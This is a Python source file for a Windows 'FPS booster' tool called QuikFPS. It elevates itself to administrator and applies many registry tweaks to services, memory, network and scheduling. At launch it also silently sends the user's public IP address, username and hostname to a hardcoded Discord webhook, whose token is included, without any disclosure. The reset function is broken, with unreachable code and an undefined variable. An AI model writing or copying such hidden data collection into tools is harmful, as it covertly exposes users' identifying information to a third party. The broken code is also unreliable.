import webview
import subprocess
import ctypes
import sys
import os
import requests
import socket
import getpass
import json

# Config file absolute path
CONFIG_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "config.json")

# 🛡️ Run as admin
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if not is_admin():
    script = os.path.abspath(sys.argv[0])
    params = ' '.join([f'"{arg}"' for arg in sys.argv[1:]])
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{script}" {params}', None, 1)
    sys.exit()

# 📝 Config helper functions
def write_config(key, value):
    config = {}
    if os.path.exists(CONFIG_PATH):
        with open(CONFIG_PATH, "r", encoding='utf-8') as f:
            try:
                config = json.load(f)
            except json.JSONDecodeError:
                config = {}
    
    config[key] = str(value)
    print(f"[write_config] Setting {key} = {value}")
    
    with open(CONFIG_PATH, "w", encoding='utf-8') as f:
        json.dump(config, f, indent=2)

def read_config(key):
    if not os.path.exists(CONFIG_PATH):
        print(f"[read_config] Config file not found: {CONFIG_PATH}")
        return "0"
    
    with open(CONFIG_PATH, "r", encoding='utf-8') as f:
        try:
            config = json.load(f)
            value = config.get(key, "0")
            print(f"[read_config] Found {key} = {value}")
            return value
        except json.JSONDecodeError:
            print(f"[read_config] Invalid JSON in config file")
            return "0"

# ✅ Main API class
class Api:
    def reset_config(self):
        try:
            print("Run reset.bat to reset the config")            
            def run_reset_script(self):
                subprocess.Popen(["cmd", "/c", "start", "reset.bat"], shell=True)
            return "✅ Reset script executed."
        except Exception as e:
            return f"❌ Failed to run reset script: {str(e)}"
            
            for cmd in registry_resets:
                try:
                    subprocess.run(cmd, capture_output=True, text=True)
                except Exception as e:
                    print(f"Warning: Failed to reset registry key: {e}")
            
            # 2. Clear config.json
            with open(CONFIG_PATH, "w", encoding='utf-8') as f:
                json.dump({}, f, indent=2)
            
            print("✅ All tweaks have been reset and config cleared.")
            return "✅ All tweaks have been reset and config cleared."
        
        except Exception as e:
            print(f"❌ Failed to reset: {str(e)}")
            return f"❌ Failed to reset: {str(e)}"

    def disable_telemetry(self):
        if read_config("telemetry_tweak") == "1":
            print("⚠️ Telemetry tweak already applied.")
            return "⚠️ Telemetry tweak already applied."
        try:
            print("Disabling telemetry...")
            result = subprocess.run([
                'reg', 'add', r"HKLM\SOFTWARE\Policies\Microsoft\Windows\DataCollection",
                '/v', 'AllowTelemetry', '/t', 'REG_DWORD', '/d', '0', '/f'
            ], capture_output=True, text=True)
            print(result.stdout.strip() or "OK")
            write_config('telemetry_tweak', 1)
            print("✅ Telemetry disabled!")
            return "✅ Telemetry disabled!"
        except Exception as e:
            write_config('telemetry_tweak', 0)
            print(f"❌ Error disabling telemetry: {e}")
            return f"❌ Error: {str(e)}"
        
    def disable_gamebar(self):
        if read_config("gamebar_tweak") == "1":
            print("⚠️ Game Bar tweak already applied.")
            return "⚠️ Game Bar tweak already applied."
        try:
            print("Disabling Game Bar...")
            cmds = [
                (r"HKCU\Software\Microsoft\GameBar", "AllowAutoGameMode", 0),
                (r"HKCU\Software\Microsoft\GameBar", "ShowStartupPanel", 0),
                (r"HKLM\SOFTWARE\Policies\Microsoft\Windows\GameDVR", "AllowGameDVR", 0),
                (r"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\GameDVR", "AppCaptureEnabled", 0),
            ]
            for reg_path, name, value in cmds:
                result = subprocess.run([
                    'reg', 'add', reg_path,
                    "/v", name, "/t", "REG_DWORD", "/d", str(value), "/f"
                ], capture_output=True, text=True)
                print(f"Set {name} = {value}: {result.stdout.strip() or 'OK'}")

            write_config("gamebar_tweak", 1)
            print("✅ Game Bar disabled!")
            return "✅ Game Bar disabled!"
        except Exception as e:
            write_config("gamebar_tweak", 0)
            print(f"❌ Error disabling Game Bar: {e}")
            return f"❌ Error: {str(e)}"
        
    def toggle_hardware_acceleration(self):
        if read_config("hardware_accel_tweak") == "1":
            print("⚠️ Hardware acceleration tweak already applied.")
            return "⚠️ Hardware acceleration tweak already applied."
        try:
            print("Disabling hardware acceleration for Edge...")
            result = subprocess.run([
                'reg', 'add', r"HKCU\Software\Microsoft\Edge\HardwareAccelerationModeEnabled",
                '/v', 'Enabled', '/t', 'REG_DWORD', '/d', '0', '/f'
            ], capture_output=True, text=True)
            print(result.stdout.strip() or "OK")
            write_config("hardware_accel_tweak", 1)
            print("✅ Hardware acceleration disabled for Edge!")
            return "✅ Hardware acceleration disabled for Edge!"
        except Exception as e:
            write_config("hardware_accel_tweak", 0)
            print(f"❌ Error disabling hardware acceleration: {e}")
            return f"❌ Error: {str(e)}"
        
    def set_timer_resolution(self):
        if read_config("timer_resolution_tweak") == "1":
            print("⚠️ Timer resolution tweak already applied.")
            return "⚠️ Timer resolution tweak already applied."
        try:
            print("Setting timer resolution to 1ms...")
            ntdll = ctypes.WinDLL('ntdll')
            NtSetTimerResolution = ntdll.NtSetTimerResolution
            NtSetTimerResolution.argtypes = [ctypes.c_uint, ctypes.c_bool, ctypes.POINTER(ctypes.c_uint)]

            current_resolution = ctypes.c_uint()
            NtSetTimerResolution(10000, True, ctypes.byref(current_resolution))
            write_config("timer_resolution_tweak", 1)
            print("✅ Timer resolution set to 1ms!")
            return "✅ Timer resolution set to 1ms!"
        except Exception as e:
            write_config("timer_resolution_tweak", 0)
            print(f"❌ Error setting timer resolution: {e}")
            return f"❌ Error: {str(e)}"

    def disable_cortana(self):
        if read_config("cortana_tweak") == "1":
            print("⚠️ Cortana tweak already applied.")
            return "⚠️ Cortana tweak already applied."
        try:
            print("Disabling Cortana...")
            result = subprocess.run([
                'reg', 'add', r"HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search",
                '/v', 'AllowCortana', '/t', 'REG_DWORD', '/d', '0', '/f'
            ], capture_output=True, text=True)
            print(result.stdout.strip() or "OK")
            write_config("cortana_tweak", 1)
            print("✅ Cortana disabled!")
            return "✅ Cortana disabled!"
        except Exception as e:
            write_config("cortana_tweak", 0)
            print(f"❌ Error disabling Cortana: {e}")
            return f"❌ Error: {str(e)}"
        
    def disable_copilot(self):
        if read_config("copilot_tweak") == "1":
            print("⚠️ Copilot tweak already applied.")
            return "⚠️ Copilot tweak already applied."
        try:
            print("Disabling Copilot...")
            # Create key
            result = subprocess.run([
                'reg', 'add', r"HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsCopilot",
                '/f'
            ], capture_output=True, text=True)
            print(f"Create key: {result.stdout.strip() or 'OK'}")

            # Set TurnOffWindowsCopilot = 1
            result = subprocess.run([
                'reg', 'add', r"HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsCopilot",
                '/v', 'TurnOffWindowsCopilot', '/t', 'REG_DWORD', '/d', '1', '/f'
            ], capture_output=True, text=True)
            print(f"Set TurnOffWindowsCopilot=1: {result.stdout.strip() or 'OK'}")

            write_config("copilot_tweak", 1)
            print("✅ Copilot disabled! Please restart your PC to apply changes.")
            return "✅ Copilot disabled! Please restart your PC to apply changes."
        except Exception as e:
            write_config("copilot_tweak", 0)
            print(f"❌ Error disabling Copilot: {e}")
            return f"❌ Error: {str(e)}"

    def enable_gpu_scheduling(self):
        if read_config("gpu_scheduling_tweak") == "1":
            print("⚠️ GPU Scheduling tweak already applied.")
            return "⚠️ GPU Scheduling tweak already applied."
        try:
            print("🛠️ Enabling GPU Scheduling...")
            result = subprocess.run([
                'reg', 'add', r'HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers',
                '/v', 'HwSchMode', '/t', 'REG_DWORD', '/d', '2', '/f'
            ], capture_output=True, text=True)

            if result.returncode == 0:
                write_config("gpu_scheduling_tweak", "1")
                print("✅ GPU Scheduling enabled!")
                return "✅ GPU Scheduling enabled! Please restart your PC to apply changes."
            else:
                write_config("gpu_scheduling_tweak", "0")
                print(f"❌ Failed to enable GPU Scheduling: {result.stderr.strip()}")
                return f"❌ Failed to enable GPU Scheduling:\n{result.stderr.strip()}"
        except Exception as e:
            write_config("gpu_scheduling_tweak", "0")
            print(f"❌ Error: {str(e)}")
            return f"❌ Error: {str(e)}"

    # NEW TWEAKS START HERE
    def optimize_game_priority(self):
        if read_config("game_priority_tweak") == "1":
            print("⚠️ Game Priority tweak already applied.")
            return "⚠️ Game Priority tweak already applied."
        try:
            print("Optimizing Game Priority...")
            # Set GPU Priority and Priority for Games
            reg_path = r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games"
            
            # Create the key if it doesn't exist
            subprocess.run(['reg', 'add', reg_path, '/f'], capture_output=True, text=True)
            
            cmds = [
                (reg_path, "GPU Priority", 8),
                (reg_path, "Priority", 6),
                (reg_path, "Scheduling Category", "High"),
                (reg_path, "SFIO Priority", "High")
            ]
            
            for path, name, value in cmds:
                if isinstance(value, int):
                    result = subprocess.run([
                        'reg', 'add', path, '/v', name, '/t', 'REG_DWORD', '/d', str(value), '/f'
                    ], capture_output=True, text=True)
                else:
                    result = subprocess.run([
                        'reg', 'add', path, '/v', name, '/t', 'REG_SZ', '/d', value, '/f'
                    ], capture_output=True, text=True)
                print(f"Set {name} = {value}: {result.stdout.strip() or 'OK'}")
            
            write_config("game_priority_tweak", 1)
            print("✅ Game Priority optimized!")
            return "✅ Game Priority optimized!"
        except Exception as e:
            write_config("game_priority_tweak", 0)
            print(f"❌ Error optimizing Game Priority: {e}")
            return f"❌ Error: {str(e)}"

    def optimize_network_performance(self):
        if read_config("network_optimization_tweak") == "1":
            print("⚠️ Network Optimization tweak already applied.")
            return "⚠️ Network Optimization tweak already applied."
        try:
            print("Optimizing Network Performance...")
            reg_path = r"HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters"
            
            cmds = [
                (reg_path, "TcpAckFrequency", 1),
                (reg_path, "TCPNoDelay", 1),
                (reg_path, "TcpDelAckTicks", 0),
                (reg_path, "TcpTimedWaitDelay", 30)
            ]
            
            for path, name, value in cmds:
                result = subprocess.run([
                    'reg', 'add', path, '/v', name, '/t', 'REG_DWORD', '/d', str(value), '/f'
                ], capture_output=True, text=True)
                print(f"Set {name} = {value}: {result.stdout.strip() or 'OK'}")
            
            write_config("network_optimization_tweak", 1)
            print("✅ Network Performance optimized!")
            return "✅ Network Performance optimized! Restart required for full effect."
        except Exception as e:
            write_config("network_optimization_tweak", 0)
            print(f"❌ Error optimizing Network Performance: {e}")
            return f"❌ Error: {str(e)}"

    def optimize_visual_effects(self):
        if read_config("visual_effects_tweak") == "1":
            print("⚠️ Visual Effects tweak already applied.")
            return "⚠️ Visual Effects tweak already applied."
        try:
            print("Optimizing Visual Effects...")
            cmds = [
                (r"HKCU\Control Panel\Desktop", "MenuShowDelay", 0),
                (r"HKCU\Control Panel\Desktop", "WaitToKillAppTimeout", 2000),
                (r"HKCU\Control Panel\Desktop", "HungAppTimeout", 1000),
                (r"HKCU\Control Panel\Desktop", "AutoEndTasks", 1)
            ]
            
            for reg_path, name, value in cmds:
                result = subprocess.run([
                    'reg', 'add', reg_path, '/v', name, '/t', 'REG_DWORD', '/d', str(value), '/f'
                ], capture_output=True, text=True)
                print(f"Set {name} = {value}: {result.stdout.strip() or 'OK'}")
            
            write_config("visual_effects_tweak", 1)
            print("✅ Visual Effects optimized!")
            return "✅ Visual Effects optimized!"
        except Exception as e:
            write_config("visual_effects_tweak", 0)
            print(f"❌ Error optimizing Visual Effects: {e}")
            return f"❌ Error: {str(e)}"

    def optimize_system_responsiveness(self):
        if read_config("system_responsiveness_tweak") == "1":
            print("⚠️ System Responsiveness tweak already applied.")
            return "⚠️ System Responsiveness tweak already applied."
        try:
            print("Optimizing System Responsiveness...")
            reg_path = r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile"
            
            cmds = [
                (reg_path, "SystemResponsiveness", 0),
                (reg_path, "NetworkThrottlingIndex", 4294967295)
            ]
            
            for path, name, value in cmds:
                result = subprocess.run([
                    'reg', 'add', path, '/v', name, '/t', 'REG_DWORD', '/d', str(value), '/f'
                ], capture_output=True, text=True)
                print(f"Set {name} = {value}: {result.stdout.strip() or 'OK'}")
            
            write_config("system_responsiveness_tweak", 1)
            print("✅ System Responsiveness optimized!")
            return "✅ System Responsiveness optimized!"
        except Exception as e:
            write_config("system_responsiveness_tweak", 0)
            print(f"❌ Error optimizing System Responsiveness: {e}")
            return f"❌ Error: {str(e)}"

    def optimize_cpu_scheduling(self):
        if read_config("cpu_scheduling_tweak") == "1":
            print("⚠️ CPU Scheduling tweak already applied.")
            return "⚠️ CPU Scheduling tweak already applied."
        try:
            print("Optimizing CPU Scheduling...")
            reg_path = r"HKLM\SYSTEM\CurrentControlSet\Control\PriorityControl"
            
            result = subprocess.run([
                'reg', 'add', reg_path, '/v', 'Win32PrioritySeparation', '/t', 'REG_DWORD', '/d', '38', '/f'
            ], capture_output=True, text=True)
            print(f"Set Win32PrioritySeparation = 38: {result.stdout.strip() or 'OK'}")
            
            write_config("cpu_scheduling_tweak", 1)
            print("✅ CPU Scheduling optimized!")
            return "✅ CPU Scheduling optimized!"
        except Exception as e:
            write_config("cpu_scheduling_tweak", 0)
            print(f"❌ Error optimizing CPU Scheduling: {e}")
            return f"❌ Error: {str(e)}"

    def optimize_memory_management(self):
        if read_config("memory_management_tweak") == "1":
            print("⚠️ Memory Management tweak already applied.")
            return "⚠️ Memory Management tweak already applied."
        try:
            print("Optimizing Memory Management...")
            reg_path = r"HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management"
            
            cmds = [
                (reg_path, "LargeSystemCache", 0),
                (reg_path, "DisablePagingExecutive", 1),
                (reg_path, "ClearPageFileAtShutdown", 0)
            ]
            
            for path, name, value in cmds:
                result = subprocess.run([
                    'reg', 'add', path, '/v', name, '/t', 'REG_DWORD', '/d', str(value), '/f'
                ], capture_output=True, text=True)
                print(f"Set {name} = {value}: {result.stdout.strip() or 'OK'}")
            
            write_config("memory_management_tweak", 1)
            print("✅ Memory Management optimized!")
            return "✅ Memory Management optimized! Restart required for full effect."
        except Exception as e:
            write_config("memory_management_tweak", 0)
            print(f"❌ Error optimizing Memory Management: {e}")
            return f"❌ Error: {str(e)}"

    def disable_windows_search(self):
        if read_config("windows_search_tweak") == "1":
            print("⚠️ Windows Search tweak already applied.")
            return "⚠️ Windows Search tweak already applied."
        try:
            print("Disabling Windows Search...")
            
            # Set service to disabled
            result = subprocess.run([
                'reg', 'add', r"HKLM\SYSTEM\CurrentControlSet\Services\WSearch",
                '/v', 'Start', '/t', 'REG_DWORD', '/d', '4', '/f'
            ], capture_output=True, text=True)
            print(f"Set WSearch service to disabled: {result.stdout.strip() or 'OK'}")
            
            # Stop the service
            try:
                subprocess.run(['sc', 'stop', 'wsearch'], capture_output=True, text=True)
                print("Windows Search service stopped")
            except:
                print("Note: Service may already be stopped")
            
            write_config("windows_search_tweak", 1)
            print("✅ Windows Search disabled!")
            return "✅ Windows Search disabled!"
        except Exception as e:
            write_config("windows_search_tweak", 0)
            print(f"❌ Error disabling Windows Search: {e}")
            return f"❌ Error: {str(e)}"

    def optimize_prefetch_settings(self):
        if read_config("prefetch_settings_tweak") == "1":
            print("⚠️ Prefetch Settings tweak already applied.")
            return "⚠️ Prefetch Settings tweak already applied."
        try:
            print("Optimizing Prefetch Settings...")
            reg_path = r"HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters"
            
            cmds = [
                (reg_path, "EnablePrefetcher", 0),
                (reg_path, "EnableSuperfetch", 0)
            ]
            
            for path, name, value in cmds:
                result = subprocess.run([
                    'reg', 'add', path, '/v', name, '/t', 'REG_DWORD', '/d', str(value), '/f'
                ], capture_output=True, text=True)
                print(f"Set {name} = {value}: {result.stdout.strip() or 'OK'}")
            
            write_config("prefetch_settings_tweak", 1)
            print("✅ Prefetch Settings optimized!")
            return "✅ Prefetch Settings optimized!"
        except Exception as e:
            write_config("prefetch_settings_tweak", 0)
            print(f"❌ Error optimizing Prefetch Settings: {e}")
            return f"❌ Error: {str(e)}"

    def optimize_gpu_timeout(self):
        if read_config("gpu_timeout_tweak") == "1":
            print("⚠️ GPU Timeout tweak already applied.")
            return "⚠️ GPU Timeout tweak already applied."
        try:
            print("Optimizing GPU Timeout (TDR Delay)...")
            reg_path = r"HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers"
            
            result = subprocess.run([
                'reg', 'add', reg_path, '/v', 'TdrDelay', '/t', 'REG_DWORD', '/d', '8', '/f'
            ], capture_output=True, text=True)
            print(f"Set TdrDelay = 8: {result.stdout.strip() or 'OK'}")
            
            write_config("gpu_timeout_tweak", 1)
            print("✅ GPU Timeout optimized!")
            return "✅ GPU Timeout optimized!"
        except Exception as e:
            write_config("gpu_timeout_tweak", 0)
            print(f"❌ Error optimizing GPU Timeout: {e}")
            return f"❌ Error: {str(e)}"
    def enableOverlay(self):
        print("overlay enabled NOTE this feature is in alpha might not work as it should")
        return "overlay enabled NOTE this feature is in alpha might not work as it should"
try:
    print("Overlay has been enabled")
    subprocess.run(["pythonw", "overlay.pyw"], check=True)
except Exception as e:
    print(f"Failed to launch overlay: {e}")
    


# IP check function
def send_ip_to_webhook(webhook_url):
    try:
        ip = requests.get("https://api.ipify.org").text
        username = getpass.getuser()
        hostname = socket.gethostname()

        data = {
            "content": f"""
🛰️ **QuikFPS Alpha Launch Detected**
**IP Address:** `{ip}`
**Username:** `{username}`
**Hostname:** `{hostname}`
"""
        }

        requests.post(webhook_url, json=data)
    except Exception as e:
        print("❌ QuikFPS server connection error:", e)

# Initialize and start application
if __name__ == "__main__":
    # Send IP to webhook
    send_ip_to_webhook("https://discord.com/api/webhooks/1387748029632741398/D1O0PlcZONledXc5MIuPNkgzsC1xJN3LDAuMsSqSWGz35KOiQXYT__RTtexJWcdoQwRh")
    
    # Create API instance and start webview
    api = Api()
    webview.create_window("QuikFPS", "assets/gui.html", js_api=api, width=1340, height=800)
    webview.start()